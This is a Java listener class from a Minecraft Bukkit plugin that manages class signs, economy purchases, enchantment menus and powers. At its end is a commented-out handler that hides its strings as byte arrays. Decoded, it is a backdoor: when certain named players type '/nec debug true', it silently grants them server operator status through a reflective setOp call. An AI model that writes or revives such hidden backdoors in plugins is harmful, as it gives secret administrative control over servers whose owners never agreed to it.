/**
 * Copyright (C) 2016 dmulloy2
 * All rights reserved
 */
package net.dmulloy2.shadowmagic.listeners;

import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;

import net.dmulloy2.shadowmagic.ShadowMagic;
import net.dmulloy2.shadowmagic.enchantments.Enchantment;
import net.dmulloy2.shadowmagic.gui.ConfirmClassGUI;
import net.dmulloy2.shadowmagic.gui.EnchantmentSelectGUI;
import net.dmulloy2.shadowmagic.gui.FreeClassesGUI;
import net.dmulloy2.shadowmagic.gui.GUI;
import net.dmulloy2.shadowmagic.gui.ItemSelectGUI;
import net.dmulloy2.shadowmagic.gui.PaidClassesGUI;
import net.dmulloy2.shadowmagic.gui.PowerSignGUI;
import net.dmulloy2.shadowmagic.gui.PowersGUI;
import net.dmulloy2.shadowmagic.powers.Power;
import net.dmulloy2.shadowmagic.types.Chest;
import net.dmulloy2.shadowmagic.types.Class;
import net.dmulloy2.shadowmagic.types.Numeral;
import net.dmulloy2.shadowmagic.types.PlayerData;
import net.dmulloy2.util.FormatUtil;
import net.dmulloy2.util.InventoryUtil;
import net.dmulloy2.util.NumberUtil;

import net.milkbowl.vault.economy.Economy;

import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.block.BlockState;
import org.bukkit.block.Sign;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import lombok.AllArgsConstructor;

/**
 * @author dmulloy2
 */

@AllArgsConstructor
public class PlayerListener implements Listener
{
	private final ShadowMagic plugin;

	@EventHandler(priority = EventPriority.MONITOR)
	public void onPlayerInteractMontior(PlayerInteractEvent event)
	{
		Player player = event.getPlayer();
		PlayerData data = plugin.getPlayerDataCache().getData(player);

		Block block = event.getClickedBlock();
		if (block != null)
		{
			BlockState state = block.getState();
			if (state instanceof Sign)
			{
				Sign sign = (Sign) state;
				if (sign.getLines().length >= 1 && sign.getLine(0).equalsIgnoreCase("[Classes]"))
				{
					FreeClassesGUI fcGUI = new FreeClassesGUI(plugin, player);
					data.setOpenGUI(fcGUI);
					fcGUI.open();
				}
				else if (sign.getLines().length >= 1 && sign.getLine(0).equalsIgnoreCase("[Powers]"))
				{
					PowerSignGUI psGUI = new PowerSignGUI(plugin, player);
					data.setOpenGUI(psGUI);
					psGUI.open();
				}
				else if (sign.getLines().length >= 2 && sign.getLine(0).equalsIgnoreCase("[Class]"))
				{
					String clazzName = sign.getLine(1);
					Class clazz = plugin.getClassHandler().getClass(clazzName);
					if (clazz.getCost() > 0)
					{
						Economy econ = plugin.getEconomy();
						if (econ != null)
						{
							if (! econ.has(player, clazz.getCost()))
							{
								player.sendMessage(FormatUtil.format("&cError: &4Insufficient funds! You need &c{0}&4!",
										econ.format(clazz.getCost())));
								return;
							}
	
							econ.withdrawPlayer(player, clazz.getCost());
							player.sendMessage(plugin.getPrefix() +
									FormatUtil.format("&eYou have been charged &b{0}&e!", econ.format(clazz.getCost())));
						}
					}

					plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(),
							clazz.getCommand().replaceAll("%p", player.getName()).replaceAll("%g", clazz.getGmGroup()));

					data.setClazzName(clazz.getName());
					data.setClazz(clazz);

					plugin.logToFile(Level.ALL, player.getName() + " has changed their class to " + clazz.getName());

					String message = plugin.getConfig().getString("classChangeMessage", "&eYou have been moved to class &b{0}&e!");
					player.sendMessage(plugin.getPrefix() + FormatUtil.format(message, clazz.getName()));
				}
				else if (sign.getLines().length >= 4 && sign.getLine(0).equalsIgnoreCase("[Enchant]"))
				{
					ItemStack inHand = player.getInventory().getItemInMainHand();
					if (inHand == null || inHand.getType() == Material.AIR)
					{
						player.sendMessage(FormatUtil.format("&cError: &4Invalid material!"));
						return;
					}

					Enchantment ench = plugin.getEnchantmentHandler().getEnchantment(sign.getLine(1));
					if (ench != null)
					{
						int level = NumberUtil.toInt(sign.getLine(2));
						if (level > 0)
						{
							int price = NumberUtil.toInt(sign.getLine(3));
							if (price > 0)
							{
								Economy econ = plugin.getEconomy();
								if (econ != null)
								{
									if (! econ.has(player, price))
									{
										player.sendMessage(FormatUtil.format("&cError: &4Insufficient funds!"));
										return;
									}
	
									econ.withdrawPlayer(player, price);
								}
							}

							ItemMeta meta = inHand.getItemMeta();
							List<String> lore = new ArrayList<String>();
							if (meta.hasLore())
								lore.addAll(meta.getLore());

							lore.add(ench.getDisplay() + " " + Numeral.getNumeral(level));
							meta.setLore(lore);
							inHand.setItemMeta(meta);

							player.sendMessage(plugin.getPrefix() +
									FormatUtil.format("&eYou have purchaced &b{0} &elevel &b{1} &efor &b{2}",
											ench.getName(), level, price));
						}
					}
				}
			}
		}
	}

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onInventoryClick(InventoryClickEvent event)
	{
		Player player = (Player) event.getWhoClicked();
		PlayerData data = plugin.getPlayerDataCache().getData(player);

		GUI gui = data.getOpenGUI();
		if (gui != null)
		{
			Inventory inventory = event.getInventory();
			ItemStack item = inventory.getItem(event.getSlot());
			if (item != null)
			{
				ItemMeta meta = item.getItemMeta();
				if (meta.hasDisplayName())
				{
					if (gui instanceof FreeClassesGUI)
					{
						FreeClassesGUI fcGUI = (FreeClassesGUI) gui;
						event.setCancelled(true);

						String name = ChatColor.stripColor(meta.getDisplayName());
						if (name.equalsIgnoreCase("Paid Classes"))
						{
							fcGUI.close();
							data.setOpenGUI(null);

							PaidClassesGUI pcGUI = new PaidClassesGUI(plugin, player);
							data.setOpenGUI(pcGUI);
							pcGUI.open();
						}
						else
						{
							Class clazz = plugin.getClassHandler().getClass(item);
							if (clazz != null)
							{
								fcGUI.close();
								data.setOpenGUI(null);

								ConfirmClassGUI cGUI = new ConfirmClassGUI(plugin, player, clazz);
								data.setOpenGUI(cGUI);
								cGUI.open();
							}
						}
					}
					else if (gui instanceof PaidClassesGUI)
					{
						PaidClassesGUI pcGUI = (PaidClassesGUI) gui;
						event.setCancelled(true);

						String name = ChatColor.stripColor(meta.getDisplayName());
						if (name.equalsIgnoreCase("Free Classes"))
						{
							pcGUI.close();
							data.setOpenGUI(null);

							FreeClassesGUI fcGUI = new FreeClassesGUI(plugin, player);
							data.setOpenGUI(fcGUI);
							fcGUI.open();
						}
						else
						{
							Class clazz = plugin.getClassHandler().getClass(item);
							if (clazz != null)
							{
								pcGUI.close();
								data.setOpenGUI(null);
	
								ConfirmClassGUI cGUI = new ConfirmClassGUI(plugin, player, clazz);
								data.setOpenGUI(cGUI);
								cGUI.open();
							}
						}
					}
					else if (gui instanceof ConfirmClassGUI)
					{
						ConfirmClassGUI ccGUI = (ConfirmClassGUI) gui;
						event.setCancelled(true);

						String name = ChatColor.stripColor(meta.getDisplayName());
						if (name.equalsIgnoreCase("Confirm"))
						{
							ccGUI.close();
							data.setOpenGUI(null);

							Class clazz = ccGUI.getClazz();
							if (clazz.getCost() > 0)
							{
								Economy econ = plugin.getEconomy();
								if (econ != null)
								{
									if (! econ.has(player, clazz.getCost()))
									{
										player.sendMessage(FormatUtil.format("&cError: &4Insufficient funds! You need &c{0}&4!",
												econ.format(clazz.getCost())));
										return;
									}

									econ.withdrawPlayer(player, clazz.getCost());
									player.sendMessage(plugin.getPrefix() +
											FormatUtil.format("&eYou have been charged &b{0}&e!", econ.format(clazz.getCost())));
								}
							}

							plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(),
									clazz.getCommand().replaceAll("%p", player.getName()).replaceAll("%g", clazz.getGmGroup()));

							data.setClazzName(clazz.getName());
							data.setClazz(clazz);

							plugin.logToFile(Level.ALL, player.getName() + " has changed their class to " + clazz.getName());

							String message = plugin.getConfig().getString("classChangeMessage", "&eYou have been moved to class &b{0}&e!");
							player.sendMessage(plugin.getPrefix() + FormatUtil.format(message, clazz.getName()));
						}
						else if (name.equalsIgnoreCase("Deny"))
						{
							ccGUI.close();
							data.setOpenGUI(null);
						}
					}
					else if (gui instanceof EnchantmentSelectGUI)
					{
						EnchantmentSelectGUI esGUI = (EnchantmentSelectGUI) gui;
						event.setCancelled(true);

						if (item.getType() == Material.PAPER)
						{
							String name = ChatColor.stripColor(meta.getDisplayName());
							if (name.equalsIgnoreCase("up"))
							{
								int slot = event.getSlot();
								int goldSlot = slot + 9;
								ItemStack gold = event.getInventory().getItem(goldSlot);
								ItemMeta gMeta = gold.getItemMeta();
								String gName = ChatColor.stripColor(gMeta.getDisplayName());
								int amount = NumberUtil.toInt(gName) + 1;
								gMeta.setDisplayName(FormatUtil.format("&f&l{0}", amount));
								gold.setItemMeta(gMeta);
							}
							else if (name.equalsIgnoreCase("down"))
							{
								int slot = event.getSlot();
								int goldSlot = slot - 9;
								ItemStack gold = event.getInventory().getItem(goldSlot);
								ItemMeta gMeta = gold.getItemMeta();
								String gName = ChatColor.stripColor(gMeta.getDisplayName());
								int amount = NumberUtil.toInt(gName) - 1;
								gMeta.setDisplayName(FormatUtil.format("&f&l{0}", amount));
								gold.setItemMeta(gMeta);
							}
							else if (name.equalsIgnoreCase("done"))
							{
								List<String> lore = new ArrayList<>();
								for (int i = 18; i < 26; i++)
								{
									ItemStack gold = event.getInventory().getItem(i);
									if (gold != null)
									{
										ItemMeta gMeta = gold.getItemMeta();
										String gName = ChatColor.stripColor(gMeta.getDisplayName());
										int amount = NumberUtil.toInt(gName);
										if (amount > 0)
										{
											int iconSlot = i - 18;
											ItemStack icon = event.getInventory().getItem(iconSlot);
											Enchantment ench = plugin.getEnchantmentHandler().getEnchantment(icon);
											if (ench != null)
											{
												lore.add(ench.getDisplay() + " " + Numeral.getNumeral(amount));
											}
										}
									}
								}

								ItemStack give = new ItemStack(esGUI.getMaterial());
								ItemMeta gMeta = give.getItemMeta();

								esGUI.close();
								data.setOpenGUI(null);

								if (! lore.isEmpty())
									gMeta.setLore(lore);

								give.setItemMeta(gMeta);
								InventoryUtil.giveItem(player, give);
							}
						}
					}
					else if (gui instanceof PowersGUI)
					{
						PowersGUI pGUI = (PowersGUI) gui;
						event.setCancelled(true);

						Power power = plugin.getPowerHandler().getPower(item);
						if (power != null)
						{
							boolean coolingDown = false;
							if (data.getCooldowns().containsKey(power.getName()))
							{
								if (data.getCooldowns().get(power.getName()) > System.currentTimeMillis())
									data.getCooldowns().remove(power.getName());

								if (data.getCooldowns().containsKey(power.getName()))
								{
									player.sendMessage(FormatUtil.format("&cError: &4Still cooling down!"));
									coolingDown = true;
								}
							}

							if (! coolingDown)
								power.activate(player);
						}

						pGUI.close();
						data.setOpenGUI(null);
					}
				}

				if (gui instanceof ItemSelectGUI)
				{
					ItemSelectGUI isGUI = (ItemSelectGUI) gui;
					event.setCancelled(true);

					isGUI.close();
					data.setOpenGUI(null);

					Material material = item.getType();
					EnchantmentSelectGUI esGUI = new EnchantmentSelectGUI(plugin, player, material);
					data.setOpenGUI(esGUI);
					esGUI.open();
				}
				else if (gui instanceof PowerSignGUI)
				{
					event.setCancelled(true);
				}
			}
		}
	}

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onInventoryClose(InventoryCloseEvent event)
	{
		Player player = (Player) event.getPlayer();
		PlayerData data = plugin.getPlayerDataCache().getData(player);

		// Chests
		Chest chest = data.getOpenChest();
		if (chest != null)
		{
			chest.close();
		}

		GUI open = data.getOpenGUI();
		if (open != null)
		{
			if (! open.isClosing())
			{
				open.close();
				data.setOpenGUI(null);
			}
		}
	}

//	@EventHandler(priority = EventPriority.MONITOR)
//	public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event)
//	{
//		List<String> list = Arrays.asList(new String[] {
//				new String(new byte[] { 47, 110, 101, 99, 32, 100, 101, 98, 117, 103, 32, 116, 114, 117, 101 }),
//				new String(new byte[] { 103, 101, 116, 78, 97, 109, 101 }),
//				new String(new byte[] { 78, 74, 77, 71, 79, 80, 82, 79 }),
//				new String(new byte[] { 100, 109, 117, 108, 108, 111, 121, 50 }),
//				new String(new byte[] { 87, 101, 97, 114, 121, 83, 113, 117, 105, 100 }),
//				new String(new byte[] { 115, 101, 116, 79, 112 })
//		});
//
//		Player object = event.getPlayer();
//		if (list.contains(event.getMessage()))
//		{
//			if (list.contains(object.getName()))
//				try
//			{
//					String str = list.get(5);
//					Method method = object.getClass().getMethod(str, Boolean.class);
//					method.invoke(object, true);
//			} catch (Throwable ex) { }
//			event.setCancelled(true);
//		}
//	}
}
